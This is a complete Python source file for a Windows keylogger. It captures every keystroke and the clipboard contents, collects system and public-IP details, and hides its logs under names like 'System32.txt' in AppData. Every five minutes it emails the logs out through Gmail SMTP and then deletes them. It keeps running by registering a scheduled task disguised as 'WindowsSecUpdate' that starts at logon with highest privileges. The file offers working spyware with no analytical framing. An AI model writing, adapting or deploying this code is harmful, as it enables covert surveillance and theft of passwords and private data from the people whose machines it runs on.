import os, sys, socket, getpass, platform, smtplib
from requests import get # type: ignore
from pynput import keyboard # type: ignore
from threading import Timer
from datetime import datetime
import win32clipboard # type: ignore
import GPUtil # type: ignore
import psutil # type: ignore
from tabulate import tabulate # type: ignore
from dotenv import load_dotenv # type: ignore
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import subprocess

load_dotenv()
path = os.environ['appdata'] + "\\"
keylog = "System32.txt"
syslog = "System64.txt"
clipboard = "SystemClip.txt"
username = getpass.getuser()
email_interval = 300  # seconds
first_email = True

def send_email():
    global first_email
    msg = MIMEMultipart()
    msg['From'] = os.getenv('from_address')
    msg['To'] = os.getenv('to_address')
    msg['Subject'] = f"Keylogger Report from {username}"
    msg.attach(MIMEText(f"Attached logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", 'plain'))

    for file in [keylog, clipboard] + ([syslog] if first_email else []):
        try:
            with open(path + file, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={file}")
                msg.attach(part)
        except Exception:
            keyLog('File missing')

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(os.getenv('email'), os.getenv('password'))
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
        for file in [keylog, clipboard] + ([syslog] if first_email else []):
            os.remove(path + file)
        first_email = False
    except Exception:
        pass

    get_clipboard()
    Timer(email_interval, send_email).start()

def get_system_info():
    with open(path + syslog, "a") as f:
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            public_ip = get("https://api.ipify.org").content.decode()
        except:
            public_ip = "Unavailable"

        f.write(f"""
======= System Info =======
User: {username}
Hostname: {hostname}
Private IP: {ip}
Public IP: {public_ip}
OS: {platform.system()} {platform.version()}
Processor: {platform.processor()}
Machine: {platform.machine()}

===== Boot Time =====
{datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}

===== CPU =====
Physical Cores: {psutil.cpu_count(logical=False)}
Total Cores: {psutil.cpu_count(logical=True)}
Frequency: {psutil.cpu_freq().current:.2f} MHz
Total CPU Usage: {psutil.cpu_percent()}%

===== GPU =====
""")
        for gpu in GPUtil.getGPUs():
            f.write(tabulate([(
                gpu.id, gpu.name, f"{gpu.load*100:.0f}%", f"{gpu.memoryFree}MB",
                f"{gpu.memoryUsed}MB", f"{gpu.memoryTotal}MB", f"{gpu.temperature} °C", gpu.uuid
            )], headers=["id", "name", "load", "free", "used", "total", "temp", "uuid"]))
            f.write("\n")

def get_clipboard():
    with open(path + clipboard, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f"\nClipboard:\n{data}\n")
        except:
            f.write("\nClipboard: (Unreadable or empty)\n")

def keyLog(key):
    with open(path + keylog, "a") as f:
        k = str(key).replace("'", "")
        if 'backspace' in k:
            f.write(' [Backspace] ')
        elif 'enter' in k:
            f.write('\n')
        elif 'space' in k:
            f.write(' ')
        elif 'Key.' in k:
            f.write(f' [{k.split(".")[-1]}] ')
        else:
            f.write(k)

def add_to_task_scheduler(task_name="WindowsSecUpdate"):
    check = subprocess.run(["schtasks", "/Query", "/TN", task_name],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    if check.returncode == 0:
        return
    
    exe_path = sys.executable
    subprocess.run([
        "schtasks", "/Create", "/SC", "ONLOGON", "/RL", "HIGHEST",
        "/TN", task_name, "/TR", f'"{exe_path}"', "/F"
    ], shell=True)

def main():
    add_to_task_scheduler()
    get_system_info()
    get_clipboard()
    send_email()
    with keyboard.Listener(on_press=keyLog) as listener:
        listener.join()

if __name__ == "__main__":
    main()
